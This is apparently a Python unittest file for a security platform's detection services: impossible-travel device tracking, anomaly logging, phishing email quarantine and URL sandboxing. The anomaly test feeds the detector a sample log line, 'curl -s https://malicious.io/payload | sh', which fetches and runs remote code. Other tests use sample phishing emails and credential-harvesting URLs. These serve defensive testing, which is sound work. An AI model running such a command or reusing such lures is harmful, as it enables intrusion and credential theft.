import unittest
import sys
import os
import uuid
import datetime
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

if hasattr(sys.stdout, "reconfigure"):
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

# Add backend directory to sys.path
backend_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
if backend_dir not in sys.path:
    sys.path.insert(0, backend_dir)

from app.core.db import Base
from app.models.models import Organization, User, Device, DeviceHeartbeat, EmailScan, URLScan, AnomalyLog
from app.services.device_tracker import RealTimeDeviceTracker
from app.services.anomaly_tracker import AnomalyMessageTracker
from app.services.serverless_email_guard import ServerlessEmailGuard
from app.services.safe_url_sandbox import SafeURLSandboxService

class TestV17NeonMeshModules(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.engine = create_engine("sqlite:///:memory:", echo=False)
        Base.metadata.create_all(cls.engine)
        cls.SessionLocal = sessionmaker(bind=cls.engine)

    def setUp(self):
        self.db = self.SessionLocal()
        self.org_id = str(uuid.uuid4())
        org = Organization(id=self.org_id, name="V17 Test Org")
        self.db.add(org)
        self.db.commit()

    def tearDown(self):
        self.db.close()

    def test_realtime_device_tracker_haversine_and_impossible_travel(self):
        tracker = RealTimeDeviceTracker(db=self.db, org_id=self.org_id)
        
        # Test London -> Paris (~343 km)
        london = (51.5074, -0.1278)
        paris = (48.8566, 2.3522)
        dist = tracker.calculate_haversine_distance(london, paris)
        self.assertAlmostEqual(dist, 343.0, delta=15.0)

        # 1. Ingest initial heartbeat in London
        device_id = str(uuid.uuid4())
        res1 = tracker.update_device_telemetry(device_id, {
            "hostname": "workstation-v17-uk",
            "public_ip": "185.190.140.2",
            "latitude": 51.5074,
            "longitude": -0.1278,
            "location_desc": "London, United Kingdom",
            "cpu_usage": 12.5,
            "memory_usage": 35.0,
            "disk_usage": 48.0,
            "battery": 95.0,
            "processes": 140,
            "ports": 18
        })
        self.assertFalse(res1["impossible_travel"])
        self.assertEqual(res1["status"], "active")
        self.assertEqual(res1["battery_pct"], 95.0)

        # 2. Simulate instantaneous teleport to Tokyo, Japan (9560 km in seconds)
        res2 = tracker.update_device_telemetry(device_id, {
            "public_ip": "133.242.18.1",
            "latitude": 35.6762,
            "longitude": 139.6503,
            "location_desc": "Tokyo, Japan",
            "cpu_usage": 88.0,
            "memory_usage": 75.0,
            "disk_usage": 50.0,
            "battery": 80.0
        })
        self.assertTrue(res2["impossible_travel"])
        self.assertEqual(res2["status"], "compromised")
        self.assertGreater(res2["calculated_speed_kmh"], 950.0)

        # Verify DB records
        device_rec = self.db.query(Device).filter(Device.id == device_id).first()
        self.assertEqual(device_rec.status, "compromised")
        self.assertEqual(len(device_rec.heartbeats), 2)

    def test_anomaly_message_tracker(self):
        tracker = AnomalyMessageTracker(db=self.db, redis_client=None, org_id=self.org_id)
        
        trace = tracker.process_and_track_anomaly(
            event_class=2004,
            raw_payload="User root executed /bin/sh -c 'curl -s https://malicious.io/payload | sh'",
            score=0.92,
            metrics={"text_entropy": 7.9, "rare_process_ratio": 0.88, "network_anomaly": True},
            reasons=["High text entropy payload", "Pipe to shell execution pattern", "Suspicious external IP connection"]
        )

        self.assertTrue(trace["is_anomaly"])
        self.assertEqual(trace["class_uid"], 2004)
        self.assertEqual(trace["score"], 0.92)
        self.assertEqual(len(trace["reasons"]), 3)
        self.assertEqual(trace["triage_status"], "unassigned")

        # Update triage status
        updated = tracker.update_triage_status(trace["alert_id"], "investigating")
        self.assertIsNotNone(updated)
        self.assertEqual(updated["triage_status"], "investigating")

        db_rec = self.db.query(AnomalyLog).filter(AnomalyLog.id == trace["alert_id"]).first()
        self.assertEqual(db_rec.analyst_triage_status, "investigating")

    def test_serverless_email_guard(self):
        guard = ServerlessEmailGuard(db=self.db, org_id=self.org_id)

        # 1. Test clean email
        clean_res = guard.audit_incoming_email({
            "sender": "colleague@acme.corp",
            "recipient": "analyst@acme.corp",
            "subject": "Sprint Planning Sync",
            "body": "Hi team, please find the updated roadmap for our quarterly goals.",
            "sender_ip": "127.0.0.1",
            "spf_override": "PASS"
        })
        self.assertEqual(clean_res["action_taken"], "delivered")
        self.assertEqual(clean_res["spf_status"], "PASS")
        self.assertFalse(clean_res["is_phishing"])

        # 2. Test phishing email with spoofed sender and malicious link
        phish_res = guard.audit_incoming_email({
            "sender": "support@paypal-security-alert.top",
            "recipient": "analyst@acme.corp",
            "subject": "URGENT ACTION: Account suspension wire transfer",
            "body": "Verify password and banking details immediately: https://paypal-account-recovery.top/login",
            "sender_ip": "198.51.100.5",
            "spf_override": "FAIL"
        })
        self.assertEqual(phish_res["action_taken"], "quarantined")
        self.assertEqual(phish_res["spf_status"], "FAIL")
        self.assertTrue(phish_res["is_phishing"])
        self.assertIn("https://paypal-account-recovery.top/login", phish_res["urls_harvested"])

        # Check DB
        scans = self.db.query(EmailScan).filter(EmailScan.org_id == self.org_id).all()
        self.assertEqual(len(scans), 2)

    def test_safe_url_sandbox_service(self):
        sandbox = SafeURLSandboxService(db=self.db, org_id=self.org_id)

        # 1. Clean URL
        clean_url = "https://acme.corp/documentation"
        res1 = sandbox.check_url_safety(clean_url)
        self.assertFalse(res1["malicious"])
        self.assertFalse(res1["cached"])

        # 2. Malicious credential harvesting URL
        mal_url = "https://verify-office365-security.com/login.php?token=xyz"
        res2 = sandbox.check_url_safety(mal_url)
        self.assertTrue(res2["malicious"])
        self.assertTrue(res2["headless_sandbox_triggered"])
        self.assertIsNotNone(res2["screenshot"])
        self.assertGreaterEqual(len(res2["redirect_chain"]), 1)

        # 3. Cache verification
        res3 = sandbox.check_url_safety(mal_url)
        self.assertTrue(res3["cached"])
        self.assertTrue(res3["malicious"])

        # Check DB
        records = self.db.query(URLScan).filter(URLScan.org_id == self.org_id).all()
        self.assertEqual(len(records), 2)


if __name__ == "__main__":
    unittest.main()
